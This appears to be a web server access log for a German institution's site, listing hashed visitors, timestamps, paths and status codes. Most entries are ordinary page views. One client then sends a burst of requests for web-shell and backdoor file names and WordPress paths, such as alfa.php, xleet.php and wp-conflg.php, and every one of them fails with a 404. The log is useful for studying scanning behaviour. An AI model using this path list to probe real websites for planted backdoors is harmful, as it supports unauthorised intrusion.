user;timestamp;referer;target;method;status
3457eb943481b01d028b062b35b6de1bc38869c47121f7f90d3a4435ed54a5fb;2025-11-21 22:57:36;;/;GET;200
d89cd4a9a98b38f95971021aae1382a9364aaaa97d6ec65fbb636b0417642613;2025-11-21 23:01:01;;/;GET;200
7f55b180f504b486404cb18a79a77b01daf738eaf816885de04aee7e65902628;2025-11-21 23:01:33;;/personen/alumni/schule/MP001;GET;200
a4a7efe8d3020e4ffcdb738388371763f86c4b6cd85c4d8dddf60b0a45a0ae89;2025-11-21 23:02:12;;/rechtliches/datenschutz;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-21 23:02:24;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-21 23:02:24;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-21 23:02:24;;/;GET;200
c141f920ebc88fd2624da29685572c724612eb4e719d7ef1791d1af10581dd15;2025-11-21 23:03:56;;/;GET;200
f3d5e064947b24c103a6a0437d95b7d5e96c98de261811da84f3bee9ce61ecf6;2025-11-21 23:04:52;;/;GET;200
40a1f2283eff6bb3fd0a255ce6912665b2e683b9abe74cb630ef2b9d1ebc840f;2025-11-21 23:11:30;;/personen/alumni/schule/5826;GET;200
4317c54cebec7137d1610f9dad387bc602b5dbaec13df4af39dfe2e9d91d5b23;2025-11-21 23:15:33;;/;GET;200
e4b0156006cdf89d60e5e7bc7561e8bdf68e55641984eb9e93fb885f4fab4dcf;2025-11-21 23:16:54;;/;GET;200
227454e452926f184f3f50c44f590d0f398f8a799f9337ebc2ebdccac6dd454f;2025-11-21 23:22:14;;/personen/alumni/schule/01A04;GET;200
234170fa8f73d794f81a8efb6a05a89c4ce556990e9b1193a3f58cdc9f180c73;2025-11-21 23:23:24;;/rechtliches/green-data;GET;200
dff02c98e5082040ee55831bf19ae7ba14ec994fc75a9291b84bd742ae493388;2025-11-21 23:28:23;;/;GET;200
cf12f3a5540c654a18d45605171815457433ad2b4b56b82243947119a2a3bd6c;2025-11-21 23:34:04;;/personen/alumni/schule/9001;GET;200
d0be8bb7fd0be6aab6961e33f9c0abdac67db68697bff4dda37e33941f51e588;2025-11-21 23:41:45;;/personen/alumni/schule/04A04;GET;200
68802343cefad432d6ee14ab959d7d77183159d4d23bc11bd0566806ae86cbc5;2025-11-21 23:42:58;;/themen/details/abschied-aus-moabit;GET;200
9f7891cbce2654195fbf7e5769ed7d2f8a01445db78c178a65eb33c8b5259a05;2025-11-21 23:43:10;;/;GET;200
9f7891cbce2654195fbf7e5769ed7d2f8a01445db78c178a65eb33c8b5259a05;2025-11-21 23:43:28;;/.well-known/security.txt;GET;404
b8f065d6a1b988578014c5a42b1f2da902493bb32f6cc9c77ee6631a179e63a6;2025-11-21 23:44:05;;/personen/alumni/schule/5505;GET;200
800664d81b1ea70652f65a0321881179675d0579f4a6cb564df7e2e5872cb933;2025-11-21 23:48:25;;/;GET;200
58b24007c60dab5c5419e584adccdb7cd5356c203b6e22eb7bc41ee26a42b701;2025-11-21 23:52:19;;/personen/alumni/schule/65936;GET;200
ef72a619f7d72b94e65d7ef8f50211ffc419bfb5bfb60f5d5b5e80f8d4070f8e;2025-11-21 23:54:01;;/themen/details/der-start-ins-studium;GET;200
1eb7a6957679a1de363739197609a2689d17ca174ee1dd7bfe190f83a05be5b3;2025-11-21 23:58:33;;/;GET;200
afc9bf1baaa16675d4dbf3eca52a1bc7e398cddfa959f0ae34419bcfda5f2ea3;2025-11-22 00:03:03;;/personen/alumni/schule/HB0001;GET;200
f6e1f337fb967658677655b3683bbfaa9381ac62f152d3fd977528ebbcd8b7ee;2025-11-22 00:04:00;;/aktuelles/stellenangebote;GET;200
029cf0e8e7a5236cf5066655a8f816ee79efe3212ea056590d57d4a730541248;2025-11-22 00:10:41;;/personen/alumni/schule/190627;GET;200
71f331bda3ff5a1b1880b5ed375ee4aaa4463d7945558b9cb3608207a62c0b22;2025-11-22 00:12:09;;/personen/alumni/schule/5501;GET;200
984f333dec00540bad34beceac101a6d30b257eeed5c328c1526841add6f5b47;2025-11-22 00:13:06;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
857ae32b51ebcdba727e164b79bfeae39bf25e2c5bb3837e5e995f15ab97a10e;2025-11-22 00:22:19;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:17;/;/aa.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:18;/;/abcd.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:19;/;/admin.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:19;/;/.__info.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:20;/;/info.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:20;/;/xmlrpc.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:21;/;/ALFA_DATA/admin.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:21;/;/aaa.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:21;/;/about.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:21;/;/admin/admin.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:22;/;/adminfuns.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:23;/;/akcc.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:24;/;/alfa.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:25;/;/build.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:25;/;/buy.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:25;/;/chosen.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:26;/;/classwithtostring.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:27;/;/default.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:29;/;/edit.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:30;/;/file.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:31;/;/filemanager.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:31;/;/flower.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:32;/;/function/function.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:33;/;/images/index.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:33;/;/images/images/about.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:34;/;/ioxi-o.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:35;/;/mari.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:35;/;/moon.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:35;/;/nc4.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:36;/;/wp-admin/about.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:36;/;/wp-admin/css/colors/blue/index.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:36;/;/wp-content/upgrade/index.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:37;/;/wp-includes/style-engine/index.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:37;/;/xleet.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:38;/;/wp-admin/includes/;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:39;/;/wp-content/uploads/admin.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:39;/;/wp-good.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:39;/;/wp-includes/Text/Diff/Renderer/;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:40;/;/wp-includes/style-engine/;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:41;/;/xmrlpc.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:41;/;/asasx.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:42;/;/autoload_classmap.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:42;/;/cong.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:43;/;/file2.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:43;/;/wp-content/index.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:44;/;/wp-content/plugins/yanierin/akcc.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:44;/;/wp-content/uploads/index.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:44;/;/wp-content/wp-conflg.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:45;/;/wp-cron.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:45;/;/wp-includes/IXR/;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:46;/;/wp-includes/block-supports/;GET;404
d434b05b4bffcc5dbc96e85c0bbca469321c7ab87e29ec83280cd45bf6058760;2025-11-22 00:23:46;;/personen/alumni/schule/5507;GET;200
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:46;/;/wp-includes/fonts/;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:47;/;/wp-includes/fonts/index.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:47;/;/wp-includes/js/crop/;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:47;/;/wp-includes/rest-api/;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:48;/;/wp-includes/widgets/;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:48;/;/ds.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:48;/;/f5.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:50;/;/god4m.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 00:23:51;/;/test1.php;GET;404
